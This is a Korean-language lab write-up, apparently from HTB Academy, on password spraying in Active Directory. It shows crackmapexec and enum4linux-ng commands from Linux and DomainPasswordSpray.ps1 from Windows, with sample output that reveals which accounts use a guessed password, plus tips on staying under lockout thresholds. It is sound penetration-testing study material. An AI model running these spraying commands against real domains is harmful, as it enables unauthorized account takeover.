초기 정보 수집 과정에서 `transporter@4` 라는 비밀번호 문자열을 발견했지만, 어느 사용자의 비밀번호인지는 모르는 상황을 가정해보자.

이 경우 동일한 비밀번호를 다수의 유효한 사용자에게 한 번씩 시도하는 패스워드 스프레이를 통해 해당 비밀번호를 사용하는 계정을 찾을 수 있다.

우선 앞서 사용한 방식으로 사용자 목록을 `users.txt` 에 저장한다:

```bash
$ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}' > users.txt
```

이제 `transporter@4` 를 사용자 목록 전체에 한 번씩 시도한다.

다음과 같이 SMB 인증을 기준으로 패스워드 스프레이를 수행할 수 있다:

```bash
$ crackmapexec smb 172.16.5.0/23 -u users.txt -p 'transporter@4'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\tjohnson:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\bross:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\jhermann:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
```

결과에서 `wley:transporter@4` 조합이 성공하여 `wley` 계정이 해당 비밀번호를 사용하고 있음을 확인할 수 있다.

하나의 계정에서 성공했다고 바로 중단하기보다, 동일한 비밀번호를 다른 사용자도 재사용하고 있을 수 있으므로 범위 내 계정을 계속 확인할 수 있다.

단, 앞서 확인한 정책의 Lockout Threshold가 5이고 Observation Window가 30분이므로 반복적인 스프레이를 수행할 때는 잠금 임계값을 넘지 않도록 시도 횟수와 간격을 조절해야 한다.

## Internal Password Spraying - from Windows

Windows에서도 기본 원리는 동일하다.

Windows에서는 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 스크립트를 사용하여 도메인 사용자에 대한 패스워드 스프레이를 수행할 수 있다.

예를 들어 다음과 같이 특정 비밀번호를 도메인 사용자에게 시도하고 성공한 계정을 파일로 저장할 수 있다:

```bash
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# SKIP

[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
```